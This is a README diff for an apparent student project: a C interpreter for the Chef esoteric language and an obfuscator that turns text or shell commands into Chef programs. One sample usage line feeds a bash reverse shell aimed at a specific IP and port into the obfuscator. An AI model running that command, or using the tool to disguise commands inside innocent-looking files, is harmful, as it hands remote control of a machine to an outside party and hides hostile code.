@@ -16,14 +16,31 @@ Together with cooking- and baking-themed commands, these three elements form a T
 
 Our final project attempts to create a Chef interpreter in C, and an obfuscator to transform simple messages to be printed or called as shell commands into Chef programs.
 
-## Instructions
+## Installation Instructions
 
 1. Clone the repository and ensure that gcc, make, and libpcre2-dev are installed (if you're using the school computers, connect to marge.stuy.edu)
     - gcc is necessary for compiling the C code
     - make is necessary for running the makefile to direct gcc what to actually compile
     - libpcre2-dev is necessary for the regular expressions used in parsing the input files, which were as far as I can tell completely unfeasible to reasonably implement using POSIX regular expressions and far too small-scale to be worth utilizing lex and yacc for
-2. Run `make compile` to compile the project, followed by `./main 'recipes/souffle.chef'` or any other Chef program to execute the interpreter. Alternatively, run `make ARGS='recipes/souffle.chef'` or any other Chef program to run the project and compile if necessary. [add more later as more features are implemented]
-3. Clean up using `make clean` at any time to delete the executable and any `.o` files
+2. Run `make compile` to compile the project.
+3. Clean up using `make clean` at any time to delete the executables and any `.o` files
+
+## Usage
+
+### To obfuscate: `./obfuscate`
+
+`Obfuscate` takes a single command flag and a string to encode and outputs a valid Chef file. The two valid flags are
+- `-p`: The Chef file will *print* the string provided.
+- `-x`: The Chef file *execute* the string provided as an `sh`-compatible shell command.
+
+Sample usage:
+- `./obfuscate -p "Hello, world!"
+- `./obuscate -p '"Chefs are nutters. They'\''re all self-obsessed, delicate, dainty, insecure little souls, and absolute psychopaths. Every last one of them." - Gordon Ramsay'
+- `./obfuscate -x 'echo "Hello, world!"'
+- `./obfuscate -x 'bash -c 'bash -i >& /dev/tcp/149.89.150.100/9001 0>&1''
+
+Watch out! Obfuscate is ONLY guaranteed to work on ASCII input with 100 or fewer distinct characters. Attempting to use it otherwise will throw an error.
+
 
 
 [^1]: Per [Wikipedia](https://en.wikipedia.org/wiki/Esoteric_programming_language): "An *esoteric programming language* (sometimes shortened to *esolang*) is a programming language designed to test the boundaries of computer programming language design, as a proof of concept, as software art, as a hacking interface to another language (particularly functional programming or procedural programming languages), or as a joke. The use of the word esoteric distinguishes them from languages that working developers use to write software … Usability is rarely a goal for designers of esoteric programming languages; often their design leads to quite the opposite."
